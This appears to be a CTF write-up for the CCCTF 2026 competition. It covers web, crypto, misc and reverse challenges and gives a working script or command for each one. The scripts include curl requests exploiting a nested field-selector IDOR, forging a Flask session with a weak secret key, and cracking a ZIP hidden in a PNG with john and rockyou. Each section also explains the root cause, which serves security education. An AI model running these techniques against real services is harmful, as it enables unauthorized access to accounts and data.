---
title: "CCCTF 2026 — Writeup"
description: "CCCTF 2026 writeup covering the challenges I solved across Web, Crypto, Misc, and Reverse: a flag hidden before a Rick Roll redirect, a weak Flask secret key, a nested field-selector IDOR, XOR key reuse, JPEG-comment stego, a ZIP appended to a PNG, and a Windows keygen."
date: 2026-08-06T01:30:55+0800
lastmod: 2026-08-06T01:30:55+0800
tag: "CCCTF, CTF, WriteUp"
lang: en-US
---

CCCTF 2026 ran from 2026-05-22 10:00 to 2026-05-24 10:00. This writeup covers the
challenges I solved, across Web, Crypto, Misc, and Reverse. Every section ends with
the flag I captured.

## Contents

| Category | Challenge | Class of bug |
|---|---|---|
| Web | Surprise | Flag in HTML before a JS redirect |
| Web | Access Any Course | IDOR via a nested field selector |
| Web | Cookie? | Forgeable Flask session, weak secret key |
| Crypto | XOR Key Reuse | Many-time pad, known plaintext |
| Misc | Haruhekage | Flag in JPEG metadata |
| Misc | Good hacker lizard | ZIP appended to a PNG, crackable password |
| Reverse | your_first_reverse | Windows keygen from XOR and addition |

---

## Web

### Surprise

#### Overview

The page at `/static/surprise.html` promises a free year of Nitro and then
redirects to a YouTube link. A redirect that fires on load is worth reading before
it runs.

#### Insight

The redirect is a client-side `window.location` assignment, so the full HTML body
is already in the response. Fetch it with `curl` and the flag sits in the `<body>`
right after the redirect script, never rendered because the browser navigates away
first.

#### Exploitation

```python
#!/usr/bin/env python3
import requests

r = requests.get("http://10.13.8.4:5000/static/surprise.html")
for line in r.text.split("\n"):
    if "CCCTF{" in line:
        print(line.strip())
        break
```

The flag is one long Rick Astley lyric.

#### Root cause

A client-side redirect hides nothing. The server sent the whole document, so
anything in it is readable regardless of what JavaScript does next.

Flag: `CCCTF{Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you}`

### Access Any Course

#### Overview

An Express.js learning platform (CCCTF Academy) with public, class, and invite-only
courses. Course `10048`, "CCCTF工作人員限定課程", is invite-only and holds the flag.
Guessing invite codes and the usual SQLi and NoSQLi attempts all failed.

#### Insight

The `?info=` query parameter is a field selector that supports nested access with
`field(subfield,...)` syntax. The frontend only ever requests safe subfields like
`course_attributes(student_count,teaching_class_name)`, but the backend never
whitelists which subfields you may ask for. The invite code lives inside
`course_attributes`, so requesting `course_attributes(invite_code)` leaks it. The
earlier attempt failed only because it asked for a top-level `invite_code`, which
does not exist; the value is nested.

#### Exploitation

```bash
# Register + login so /api/course/{id} is reachable
curl -s -c c.txt -X POST http://10.13.8.7:3000/api/auth/signup \
  -H "Content-Type: application/json" \
  -d '{"username":"hax123abc","password":"Test1234!"}'
curl -s -c c.txt -b c.txt -X POST http://10.13.8.7:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"hax123abc","password":"Test1234!"}'

# Leak the invite code via the nested selector
curl -sL -b c.txt \
  "http://10.13.8.7:3000/api/course/10048?info=id,name,course_attributes(invite_code)"
# -> {"id":"10048","name":"...","course_attributes":{"invite_code":"1AEV9VE28PHP"}}

# Enroll with the leaked code, then read the materials
curl -sL -b c.txt -X POST http://10.13.8.7:3000/api/enroll/10048 \
  -H "Content-Type: application/json" -d '{"invite_code":"1AEV9VE28PHP"}'
curl -sL -b c.txt http://10.13.8.7:3000/api/course/10048/materials
```

#### Root cause

A field selector that reaches nested attributes needs a whitelist. Without one, a
client can project any internal field into the response, which is an IDOR on the
data layer rather than the URL.

Flag: `CCCTF{1n5p1r3d_8y_7h3_1n53cur3_D1r3c7_08j3c7_R3f3r3nc3_vu1n3r481117y_CVE-2026-2997}`

### Cookie?

#### Overview

A Flask forum whose session is a signed cookie. The hint is about cookies, and this
app shares its source with a few other Web challenges in the set.

#### Insight

The Flask secret key is the default-weak `"key"`. A Flask session is signed, not
encrypted, so anyone who knows the key can both read and forge it. The session
already contains a `flag` field, so decoding your own cookie is enough.

#### Exploitation

```python
from itsdangerous import URLSafeTimedSerializer
import requests

BASE = "http://10.13.8.4:5000"
s = requests.Session()
s.post(f"{BASE}/register", data={"name": "user", "pw": "pass123", "pw2": "pass123"})
s.post(f"{BASE}/login",    data={"name": "user", "pw": "pass123"})

serializer = URLSafeTimedSerializer("key", salt="cookie-session",
                                    signer_kwargs={"key_derivation": "hmac"})
data = serializer.loads(s.cookies.get("session"))
print(data["flag"])
```

#### Root cause

A signed session protects integrity, not secrecy, and a guessable secret key removes
even that. Putting the flag in the session and signing it with `"key"` hands it to
every logged-in user.

Flag: `CCCTF{太大聲太小聲去跟舍監反應🗣️🗣️會改進 不想聽可以包一包滾回🫦…滾出宿舍🔥🔥🔥👺👺👺 不是像沒爸沒媽🤏🤏🤏對老子的歌指指點點🖕🖕 老子播什麼你聽什麼🗣️🗣️🤡🤡👊👊👊👊 另外！靠杯一中版的 🗣️🗣️🗣️（哦哦哦哦哦哦哦） 🗣️🗣️🗣️🗣️🗣️靠杯一中版🗣️🗣️🗣️ （哦哦哦哦哦） 🗣️🗣️🗣️🗣️🗣️的🗣️🗣️🗣️（哦哦哦哦哦哦） 🗣️🗣️🗣️🗣️🗣️近期對於公開平台🗣️🗣️🗣️（哦哦哦哦哦哦）🗣️🗣️🗣️🗣️🗣️（沃草）🗣️🗣️🗣️🗣️🗣️（哦哦哦哦哦哦）（119）🗣️🗣️🗣️🗣️🗣️🗣️🗣️🗣️🗣️🗣️🗣️🗣️}`

---

## Crypto

### XOR Key Reuse

#### Overview

An XOR encryption server hands out two ciphertexts under the same key: `ct1` is the
flag, `ct2` is a known welcome message. Reusing one key across two messages breaks
the one-time pad.

#### Insight

If both ciphertexts share a key, then `key = ct2 XOR known`, and once the key is
known, `flag = ct1 XOR key`. This is the classic many-time pad mistake. The known
plaintext is enough to recover the key across the flag's length.

#### Exploitation

```python
#!/usr/bin/env python3
from pwn import xor

ct1 = bytes.fromhex('2bf73144ec09e5fb4e25d79a31b88b9dc01dedd8d3bd7b27504c0745d5717433')
ct2 = bytes.fromhex('3ade1c60f81cb0a96521c4bb2198988ddd4dc090d096767c500b475297726e2d')
known = bytes.fromhex('57656c636f6d6520746f20584f5220656e6372797074696f6e20736572766963')

key = xor(ct2, known)
flag = xor(ct1, key)
print(flag.decode())
```

#### Root cause

A one-time pad is only secure when the key is used once. Reuse turns the XOR of two
ciphertexts into the XOR of two plaintexts, and a single known message recovers the
key outright.

Flag: `FLAG{x0r_k3y_r3us3_1s_d4ng3r0us}`

---

## Misc

### Haruhekage

#### Overview

A single JPEG and a prompt about finding what is on Soyo's mind. That framing points
at hidden data in the image rather than the pixels.

#### Insight

The flag is stored in the JPEG's metadata, so `strings` finds it directly.

#### Exploitation

```bash
strings haruhekage.jpg | grep CCCTF
# CCCTF{nannde_haruhekage_yattano!!!}
```

#### Root cause

Image metadata is trivial to read. Anything written into an EXIF or comment field is
plain text to anyone with `strings`.

Flag: `CCCTF{nannde_haruhekage_yattano!!!}`

### Good hacker lizard

#### Overview

A large PNG of a lizard. The description hints that a certificate was not captured by
the camera, which nudges toward data hidden after the image.

#### Insight

A ZIP archive is appended after the PNG's `IEND` chunk, holding a password-protected
`flag.txt`. The PNG also carries a `caBX` C2PA metadata chunk, which is a red herring
matching the "certificate" wording.

#### Exploitation

```bash
# Carve the appended ZIP starting at the PK signature
python3 -c "
data = open('challenge.png','rb').read()
off = data.find(b'PK\x03\x04')
open('/tmp/lizard.zip','wb').write(data[off:])
"

# The archive is stored (uncompressed), so cracking is fast
zip2john /tmp/lizard.zip > /tmp/lizard.hash
john --wordlist=rockyou.txt /tmp/lizard.hash   # -> L1zard
unzip -P L1zard -o /tmp/lizard.zip
cat flag.txt
```

The password `L1zard` is in rockyou.txt, so the standard wordlist cracks it on the
first pass.

#### Root cause

A PNG ends at `IEND`; bytes after it are ignored by viewers but still on disk, and
a weak password that sits in rockyou.txt gives up the appended ZIP in one pass.

Flag: `CCCTF{G00d_H4ck3r_L1zard_5ay_H3ll0}`

---

## Reverse

### your_first_reverse

#### Overview

A Windows PE32 console binary that reads 18 characters, transforms them, and compares
against hardcoded data. Rather than run it, the check can be inverted from the
constants in the binary.

#### Insight

The comparison is `input[i] ^ xor_key[i] == fake_flag[i] + second_array[i]`, where:

- a fake flag `CTF{oF_cOUrS3_7hiS_is_no7_r34l_fL49}` sits at `0x41f000`,
- `second_array` is the last 18 bytes of that fake flag (at `0x41f012`),
- `xor_key` is a dword array at `0x41f028`.

Solving for the input gives `input[i] = (fake_flag[i] + second_array[i]) ^ xor_key[i]`.

#### Exploitation

```python
#!/usr/bin/env python3
data = open("chal.exe", "rb").read()

fake_flag_str = b"CTF{oF_cOUrS3_7hiS_is_no7_r34l_fL49}"
off = data.find(fake_flag_str)

fake_flag    = data[off:off + 36]
second_array = data[off + 18:off + 36]
xor_key = [data[off + 0x28 + i * 4] for i in range(18)]

flag = "".join(chr(((fake_flag[i] + second_array[i]) & 0xFF) ^ xor_key[i]) for i in range(18))
print(flag)
```

#### Root cause

The check is fully reversible from data baked into the binary. Byte-wise XOR and
addition against known constants is a keygen, not protection.

Flag: `CCCTF{y3lP_gPjlUo}`
